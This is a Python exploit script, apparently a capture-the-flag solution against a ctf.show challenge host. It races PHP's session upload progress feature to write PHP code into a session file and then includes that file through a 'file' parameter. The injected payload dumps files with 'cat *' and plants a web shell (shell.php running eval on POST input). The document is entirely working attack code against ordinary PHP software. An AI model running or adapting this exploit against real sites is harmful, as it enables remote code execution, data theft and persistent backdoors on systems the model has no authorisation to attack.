import io
import sys
import requests
import threading

sessid = 'Qftm'


def POST(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        session.post(
            'http://685764be-83ff-455b-bc13-be2fb150d09f.challenge.ctf.show/',
            data={
                "PHP_SESSION_UPLOAD_PROGRESS": "<?php system('cat *');fputs(fopen('shell.php','w'),'<?php @eval($_POST[mtfQ])?>');?>"},
            files={"file": ('q.txt', f)},
            cookies={'PHPSESSID': sessid}
        )


def READ(session):
    while True:
        response = session.get(
            f'http://685764be-83ff-455b-bc13-be2fb150d09f.challenge.ctf.show/?file=/tmp/sess_{sessid}')
        if 'flag' not in response.text:
            print('[+++]retry')
        else:
            print(response.text)
            sys.exit(0)


with requests.session() as session:
    t1 = threading.Thread(target=POST, args=(session,))
    t1.daemon = True
    t1.start()

    READ(session)
